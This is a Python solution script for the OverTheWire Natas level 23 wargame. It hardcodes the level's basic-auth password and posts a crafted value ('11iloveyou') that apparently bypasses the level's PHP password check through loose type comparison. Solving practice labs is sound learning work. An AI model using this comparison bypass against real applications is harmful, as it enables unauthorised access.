```
#!/usr/bin/env python
import requests
import re

username = 'natas23'
password = 'dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.post(url, data = {"passwd":"11iloveyou"}, auth=(username, password))
content = response.text

print(content)
```
